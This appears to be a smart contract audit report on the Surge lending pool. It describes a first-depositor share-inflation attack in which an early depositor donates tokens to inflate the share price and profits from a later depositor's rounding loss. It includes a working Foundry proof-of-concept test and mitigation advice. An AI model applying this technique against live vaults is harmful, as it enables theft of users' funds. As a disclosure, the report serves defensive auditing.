# First depositor attack: first (early depositors) can steal funds from later depositors.

## Summary
First (early depositors) can steal funds from later depositors by manipulating the price of pool tokens. 

## Vulnerability Detail
Below we show how the first Depositor, Bob,  (actually all early depositors can benefit as well) can steal funds from later depositors, for example, from Alice.

1) Initially, Bob has 1e18+1 loan tokens and Alice has 2e18 loan tokens. 

2) Bob calls ``deposit`` to deposit 1 loan token and he gets back 1 pool token share. The price of the pool token is 1/share.

[https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L307-L343](https://github.com/sherlock-audit/2023-02-surge/blob/main/surge-protocol-v1/src/Pool.sol#L307-L343)

3) Bob sends 1e18 loan tokens to the pool, now the price per share becomes ``1e18+1/share``.

4) Alice also calls ``deposit()`` to deposit ``2e18`` loan tokens to the pool, she gets back 1 pool share and the ``totalSupply = 2``, and the price per share becomes ``1.5e18/share``. 

5) Bob calls ``withdraw()`` to withdraw his 1 share, and he gets 1.5e18 loan tokens. He gains ``0.5e18-1`` loan tokens. 

6) Alice withdraws her 1 pool share, and gets ``1.5e18+1`` loan tokens.  She loses ``0.5e18-1`` loan tokens. 

7) Bob steals ``0.5e18-1`` loan tokens from Alice. 

8) The following code POC confirms the finding:

```javascript
function testFirstDepositorAttack() external {
        uint amount = 3e18+1;
        MockERC20 collateralToken = new MockERC20(0, 18);
        MockERC20 loanToken = new MockERC20(amount, 18);
        Pool pool = factory.deploySurgePool(IERC20(address(collateralToken)), IERC20(address(loanToken)), 1e18, 0.8e18, 1e15, 1e15, 0.1e18, 0.4e18, 0.6e18);
        loanToken.transfer(address(1), 2e18);

        loanToken.approve(address(pool), 1);
        pool.deposit(1);
        loanToken.transfer(address(pool), 1e18);
     
        vm.prank(address(1));
        loanToken.approve(address(pool), 2e18);
        vm.prank(address(1));
        pool.deposit(2e18); 

        pool.withdraw(type(uint).max);
        assertEq(loanToken.balanceOf(address(this)), 1.5e18);
        
        vm.prank(address(1));
        pool.withdraw(type(uint).max);
        assertEq(loanToken.balanceOf(address(1)), 1.5e18+1);
    }   
```

Manual Review

## Recommendation
- Have a minimum deposit limit
- From the first depositor, send 1000 shares (corresponds to 1000 wei of loan tokens, which is nothing) to a dead address. In this way, it will be very expensive to inflate the price per share.
